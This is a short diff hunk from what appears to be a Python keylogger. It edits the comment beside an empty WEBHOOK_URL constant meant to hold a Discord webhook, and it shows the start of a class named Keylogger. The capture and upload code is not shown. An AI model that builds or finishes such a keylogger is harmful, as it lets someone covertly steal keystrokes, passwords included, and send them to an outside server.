@@ -3,7 +3,7 @@ import threading
 import dhooks
 
 
-WEBHOOK_URL = "" # Put here your discord webhook
+WEBHOOK_URL = ""  # Put here your discord webhook url
 
 
 class Keylogger:
